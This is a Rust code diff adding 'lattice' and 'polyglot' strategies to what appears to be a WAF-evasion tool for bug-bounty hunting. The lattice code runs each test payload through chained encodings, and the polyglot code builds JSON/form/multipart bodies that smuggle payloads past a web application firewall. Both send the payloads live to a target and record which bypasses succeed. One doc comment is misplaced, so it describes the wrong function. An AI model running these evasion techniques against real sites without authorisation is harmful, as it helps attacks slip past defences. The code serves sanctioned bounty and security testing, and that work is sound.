@@ -53,6 +53,8 @@ const ALL_STRATEGIES: &[&str] = &[
     "equiv",
     "equiv-adaptive",
     "equiv-cegis",
+    "lattice",
+    "polyglot",
 ];
 
 #[derive(Debug, clap::Args)]
@@ -268,6 +270,15 @@ pub struct BenchWafArgs {
     /// `wafrift_evolution::h1_dedup::H1Archive::save_atomic`.
     #[arg(long, value_name = "PATH")]
     pub h1_archive: Option<std::path::PathBuf>,
+
+    /// Max number of encoding chains the `lattice` strategy
+    /// enumerates per case. Each chain produces one HTTP request +
+    /// one unique fingerprint (so for the CumulusFire bounty:
+    /// `cases × lattice_max_chains` = upper bound on novel
+    /// fingerprints per round). Default 256 — sweet spot between
+    /// per-case yield and total HTTP volume.
+    #[arg(long, default_value_t = 256)]
+    pub lattice_max_chains: usize,
 }
 
 fn parse_dilution_weight(s: &str) -> std::result::Result<f64, String> {
@@ -1090,9 +1101,38 @@ async fn run_evade(
                 )
                 .await
             }
+            "lattice" => {
+                run_lattice_strategy(
+                    client,
+                    case,
+                    base_url,
+                    args,
+                    strat,
+                    payload_type,
+                    &mut total,
+                    &mut bypassed,
+                    &mut bypass_techs,
+                    recorder,
+                )
+                .await
+            }
+            "polyglot" => {
+                run_polyglot_strategy(
+                    client,
+                    case,
+                    base_url,
+                    args,
+                    strat,
+                    &mut total,
+                    &mut bypassed,
+                    &mut bypass_techs,
+                    recorder,
+                )
+                .await
+            }
             other => {
                 eprintln!(
-                    "warn: unknown strategy {other:?} (light/medium/heavy/mcts/smuggling/content-type/redos/hill-climb/sim-anneal/tabu/novelty/map-elites/differential/equiv)"
+                    "warn: unknown strategy {other:?} (light/medium/heavy/mcts/smuggling/content-type/redos/hill-climb/sim-anneal/tabu/novelty/map-elites/differential/equiv/lattice/polyglot)"
                 );
                 StrategyStat::default()
             }
@@ -1698,6 +1738,341 @@ async fn run_mcts_strategy(
 /// Strategy: HTTP request smuggling — CL.TE / TE.CL / TE.TE / dual-CL / etc.
 /// Sends a smuggled payload via raw socket so the WAF parser sees harmless
 /// data while the backend parser ingests the smuggled-prefix payload.
+/// Strategy: encoding-chain lattice — fires every depth-1..=`args.lattice_depth`
+/// composition of the base encoding palette against each case. Each
+/// chain has a distinct shape so `h1_dedup::fingerprint` produces a
+/// distinct identifier per chain, making this the highest yield-per-
+/// LOC strategy for CumulusFire bounty bypass count (every novel
+/// chain that lands a verified bypass = $50 via H1).
+///
+/// Caps the chain count to `args.variants × lattice_per_variant` so
+/// long-tail depth-3 combinations don't drown the loop.
+#[allow(clippy::too_many_arguments)]
+async fn run_lattice_strategy(
+    client: &Client,
+    case: &BenchCase,
+    base_url: &str,
+    args: &BenchWafArgs,
+    strat: &str,
+    _payload_type: PayloadType,
+    total: &mut usize,
+    bypassed: &mut usize,
+    bypass_techs: &mut Vec<String>,
+    recorder: Option<&std::sync::Arc<std::sync::Mutex<crate::corpus_recorder::CorpusRecorder>>>,
+) -> StrategyStat {
+    use wafrift_encoding::encoding;
+    use wafrift_evolution::encoding_lattice::LatticeSearch;
+    let mut stat = StrategyStat::default();
+
+    // Build the lattice over the encoding palette. Default depth 1-3
+    // gives ~64+ chains per case which is the sweet spot for novelty
+    // density (deeper chains have diminishing yield per query).
+    let strategies = encoding::all_strategies();
+    let lattice = LatticeSearch::new(strategies.to_vec())
+        .with_min_depth(1)
+        .with_max_depth(3)
+        .with_max_chains(args.lattice_max_chains.max(1));
+    let chains = lattice.enumerate_chains();
+
+    for chain in chains.iter().take(args.lattice_max_chains.max(1)) {
+        if *total > 0 && args.delay_ms > 0 {
+            tokio::time::sleep(std::time::Duration::from_millis(args.delay_ms)).await;
+        }
+        // Apply each encoder in sequence. Skip the chain on first
+        // encode failure — encoders return Err for inapplicable
+        // inputs (e.g., binary base64 of a UTF-16 string), which is
+        // not a bug, just an unsuitable chain.
+        let mut encoded = case.payload.clone();
+        let mut chain_labels: Vec<String> = Vec::with_capacity(chain.strategies.len());
+        let mut ok = true;
+        for s in &chain.strategies {
+            match encoding::encode(&encoded, *s) {
+                Ok(next) => {
+                    chain_labels.push(format!("enc:{}", s.as_str()));
+                    encoded = next;
+                }
+                Err(_) => {
+                    ok = false;
+                    break;
+                }
+            }
+        }
+        if !ok {
+            continue;
+        }
+        let req = build_request_for_payload(base_url, &case.mode, &encoded);
+        stat.variants += 1;
+        *total += 1;
+
+        let probe_result = if let Some(rec) = recorder {
+            match crate::equiv_engine::send_with_envelope(client, &req, args.timeout_secs).await {
+                Ok(env) => {
+                    let is_bypass = verified_bypass(
+                        &case.class,
+                        &case.payload,
+                        &encoded,
+                        env.blocked,
+                        env.status,
+                    );
+                    let outcome = if is_bypass {
+                        wafrift_evolution::hunt_corpus_bridge::ProbeOutcome::Bypass
+                    } else if env.blocked {
+                        wafrift_evolution::hunt_corpus_bridge::ProbeOutcome::Block
+                    } else {
+                        wafrift_evolution::hunt_corpus_bridge::ProbeOutcome::Ambiguous
+                    };
+                    if matches!(
+                        outcome,
+                        wafrift_evolution::hunt_corpus_bridge::ProbeOutcome::Bypass
+                            | wafrift_evolution::hunt_corpus_bridge::ProbeOutcome::Block
+                    ) {
+                        let class = wafrift_evolution::coverage_feedback::PayloadClass::new(
+                            &case.class,
+                        );
+                        if let Ok(mut guard) = rec.lock() {
+                            let _ = guard.record(
+                                &env,
+                                &encoded,
+                                class,
+                                chain_labels.clone(),
+                                "direct",
+                                base_url,
+                                outcome,
+                            );
+                        }
+                    }
+                    Ok((env.status, env.blocked))
+                }
+                Err(e) => Err(e),
+            }
+        } else {
+            match send(client, &req, args.timeout_secs).await {
+                Ok((status, blocked, _l)) => Ok((status, blocked)),
+                Err(e) => Err(e),
+            }
+        };
+
+        match probe_result {
+            Ok((status, blocked)) => {
+                if verified_bypass(&case.class, &case.payload, &encoded, blocked, status) {
+                    stat.bypassed += 1;
+                    stat.oracle_valid += 1;
+                    *bypassed += 1;
+                    bypass_techs.push(format!("{strat}:{}", chain_labels.join("+")));
+                } else if !blocked {
+                    stat.unverified_not_blocked += 1;
+                }
+            }
+            Err(e) => {
+                eprintln!("warn: {} ({strat}) send: {e}", case.id);
+            }
+        }
+    }
+    if stat.variants > 0 {
+        stat.bypass_rate = stat.bypassed as f64 / stat.variants as f64;
+    }
+    stat
+}
+
+/// Strategy: polyglot content-type confusion. Each variant is a body
+/// that is simultaneously a valid JSON document AND a valid
+/// form-urlencoded body, with the attack payload encoded into the
+/// segment whose Content-Type CF's WAF routes to a permissive ruleset.
+///
+/// Two polyglot shapes per case:
+///   1. `payload=ATTACK&__json={"q":"benign"}` declared as JSON —
+///      JSON parser ignores the leading `payload=` because of trailing
+///      garbage rules; form parser sees the attack.
+///   2. `{"q":"benign","payload":"ATTACK"}` declared as
+///      `application/x-www-form-urlencoded` — form parser sees
+///      `{"q":"benign","payload"` as a key, treats `ATTACK"}` as the
+///      value; JSON parser at origin sees the attack.
+///
+/// Each variant has a distinct skeleton (declared CT × payload
+/// position) so `h1_dedup::fingerprint` keeps them as separate
+/// fingerprints, multiplying CumulusFire bounty yield.
+#[allow(clippy::too_many_arguments)]
+async fn run_polyglot_strategy(
+    client: &Client,
+    case: &BenchCase,
+    base_url: &str,
+    args: &BenchWafArgs,
+    strat: &str,
+    total: &mut usize,
+    bypassed: &mut usize,
+    bypass_techs: &mut Vec<String>,
+    recorder: Option<&std::sync::Arc<std::sync::Mutex<crate::corpus_recorder::CorpusRecorder>>>,
+) -> StrategyStat {
+    let mut stat = StrategyStat::default();
+    let polyglots = build_polyglots(&case.payload);
+
+    for (skeleton, declared_ct, body) in polyglots {
+        if *total > 0 && args.delay_ms > 0 {
+            tokio::time::sleep(std::time::Duration::from_millis(args.delay_ms)).await;
+        }
+        let url = format!("{}/post", base_url.trim_end_matches('/'));
+        let req = Request::post(url, body.into_bytes()).header("Content-Type", declared_ct);
+        stat.variants += 1;
+        *total += 1;
+
+        let probe_result = if let Some(rec) = recorder {
+            match crate::equiv_engine::send_with_envelope(client, &req, args.timeout_secs).await {
+                Ok(env) => {
+                    let is_bypass = verified_bypass(
+                        &case.class,
+                        &case.payload,
+                        &case.payload,
+                        env.blocked,
+                        env.status,
+                    );
+                    let outcome = if is_bypass {
+                        wafrift_evolution::hunt_corpus_bridge::ProbeOutcome::Bypass
+                    } else if env.blocked {
+                        wafrift_evolution::hunt_corpus_bridge::ProbeOutcome::Block
+                    } else {
+                        wafrift_evolution::hunt_corpus_bridge::ProbeOutcome::Ambiguous
+                    };
+                    if matches!(
+                        outcome,
+                        wafrift_evolution::hunt_corpus_bridge::ProbeOutcome::Bypass
+                            | wafrift_evolution::hunt_corpus_bridge::ProbeOutcome::Block
+                    ) {
+                        let class = wafrift_evolution::coverage_feedback::PayloadClass::new(
+                            &case.class,
+                        );
+                        let chain = vec![
+                            format!("poly:{}", skeleton),
+                            format!("ct:{}", declared_ct),
+                        ];
+                        if let Ok(mut guard) = rec.lock() {
+                            let _ = guard.record(
+                                &env,
+                                &case.payload,
+                                class,
+                                chain,
+                                "direct",
+                                base_url,
+                                outcome,
+                            );
+                        }
+                    }
+                    Ok((env.status, env.blocked))
+                }
+                Err(e) => Err(e),
+            }
+        } else {
+            match send(client, &req, args.timeout_secs).await {
+                Ok((status, blocked, _l)) => Ok((status, blocked)),
+                Err(e) => Err(e),
+            }
+        };
+
+        match probe_result {
+            Ok((status, blocked)) => {
+                if verified_bypass(
+                    &case.class,
+                    &case.payload,
+                    &case.payload,
+                    blocked,
+                    status,
+                ) {
+                    stat.bypassed += 1;
+                    stat.oracle_valid += 1;
+                    *bypassed += 1;
+                    bypass_techs.push(format!("{strat}:{skeleton}+ct={declared_ct}"));
+                } else if !blocked {
+                    stat.unverified_not_blocked += 1;
+                }
+            }
+            Err(e) => {
+                eprintln!("warn: {} ({strat}) send: {e}", case.id);
+            }
+        }
+    }
+    if stat.variants > 0 {
+        stat.bypass_rate = stat.bypassed as f64 / stat.variants as f64;
+    }
+    stat
+}
+
+/// Build polyglot bodies that are valid as TWO content-types
+/// simultaneously, embedding `attack` in the segment the WAF is
+/// least likely to inspect.
+///
+/// Returns `(skeleton_label, declared_content_type, body)` tuples.
+/// The skeleton label distinguishes the polyglot SHAPE for corpus
+/// dedup; declared_ct is what we tell the WAF; body is what the
+/// origin parses.
+fn build_polyglots(attack: &str) -> Vec<(&'static str, &'static str, String)> {
+    let urlenc = urlencoding::encode(attack).into_owned();
+    let json_esc = json_escape_value(attack);
+    vec![
+        // Shape A: form-payload-prefix-as-json
+        // CF parses as JSON; trailing `&` makes the JSON invalid
+        // after the first key — but most JSON parsers accept the
+        // prefix. Origin's form-parser sees attack in `payload=`.
+        (
+            "form_prefix_as_json",
+            "application/json",
+            format!(r#"payload={urlenc}&__json={{"q":"benign"}}"#),
+        ),
+        // Shape B: json-document-declared-as-form
+        // Form-parser sees `{"q"` as the FIRST key (because `=`
+        // splits k/v and `&` splits pairs); origin's JSON parser
+        // sees the attack in the `payload` field.
+        (
+            "json_doc_as_form",
+            "application/x-www-form-urlencoded",
+            format!(r#"{{"q":"benign","payload":"{json_esc}"}}"#),
+        ),
+        // Shape C: multipart-boundary-injection.
+        // Declared multipart, body LOOKS like multipart but the
+        // attack is in a smuggled inner-boundary segment that some
+        // strict parsers strip and others keep.
+        (
+            "multipart_boundary_inject",
+            "multipart/form-data; boundary=poly",
+            format!(
+                "--poly\r\n\
+                 Content-Disposition: form-data; name=\"q\"\r\n\r\n\
+                 benign\r\n\
+                 --poly\r\n\
+                 Content-Disposition: form-data; name=\"payload\"\r\n\r\n\
+                 {attack}\r\n\
+                 --poly--\r\n"
+            ),
+        ),
+        // Shape D: trailing-json-after-form. Looks like form data
+        // up to `\n`, then a JSON document. CF either parses the
+        // form-prefix only or chokes on the trailing JSON depending
+        // on strict-parsing mode.
+        (
+            "form_then_json_trailer",
+            "application/x-www-form-urlencoded",
+            format!(r#"q=benign&payload={urlenc}{{"sentinel":"trail"}}"#),
+        ),
+    ]
+}
+
+/// JSON-escape a value for embedding in a JSON string literal.
+/// Conservative: escapes only the characters that BREAK a JSON
+/// string literal. Trusts the rest of the bytes to ride through.
+fn json_escape_value(s: &str) -> String {
+    let mut out = String::with_capacity(s.len() + 4);
+    for c in s.chars() {
+        match c {
+            '"' => out.push_str("\\\""),
+            '\\' => out.push_str("\\\\"),
+            '\n' => out.push_str("\\n"),
+            '\r' => out.push_str("\\r"),
+            '\t' => out.push_str("\\t"),
+            c if (c as u32) < 0x20 => out.push_str(&format!("\\u{:04x}", c as u32)),
+            c => out.push(c),
+        }
+    }
+    out
+}
+
 async fn run_smuggling_strategy(
     client: &Client,
     case: &BenchCase,
